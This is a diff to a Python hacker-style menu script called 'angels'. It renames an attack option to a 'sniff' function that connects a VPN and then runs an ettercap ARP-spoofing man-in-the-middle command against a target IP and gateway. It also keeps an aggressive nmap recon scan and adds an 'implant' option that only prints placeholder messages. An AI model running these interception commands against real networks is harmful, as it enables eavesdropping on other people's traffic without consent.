@@ -41,13 +41,13 @@ def angels():
     print("4. Scan")
     print("5. Neuclear")
     print("")
-    choice = int(input())
+    choice = int(input("|\ANGEL/|: "))
 
     def choice_check():
         if choice == 1:
             recon()
         elif choice == 2:
-            attack()
+            sniff()
         elif choice == 3:
             implant()
         elif choice == 4:
@@ -81,13 +81,17 @@ def angels():
 
 def recon():
     jay("starting recon angel")
-    jay("plesase input the ip of ypur target")
+    jay("please input the ip of your target")
     ip = input("||:IP:||: ")
     os.system(f"sudo nmap -Pn -O -A {ip}")
     
 
-def attack():
-    jay("starting attack angel")
+def sniff():
+    jay("starting sniffing angel")
+    jay("securing you system")
+    os.system("protonvpn-cli c -f")
+    jay("system secured")
+    jay("please input the ip of your target and the gateway of the network your on")
     ip = input("||*IP*||: ")
     gateway = input("||*GATEWAY*||: ")
     os.system(f"sudo ettercap -T -S -i wlo1 -M arp:remote /{gateway}// /{ip}//")
@@ -95,6 +99,19 @@ def attack():
 
 def implant():
     jay("starting implant angel")
+    jay("for what os do you need an implant")
+    im_os = input("|||IMPLANT OS|||: ")
+    jay("what should i name the implant file")
+    im_name = input("|||IMPLANT NAME|||: ")
+    jay("getting implant file ready")
+    if im_os.lower() == "windows":
+        jay("implant file is ready sir")
+        pass
+    elif im_os.lower() == "linux":
+        jay("implant file is ready sir")
+        pass
+    else:
+        jay("sorry but i can only provide implants for windows and linux")
     pass
 
 def scan():
@@ -105,4 +122,3 @@ def scan():
 def neuclear():
     jay("neuclear angel protocol has started")
     pass
- 
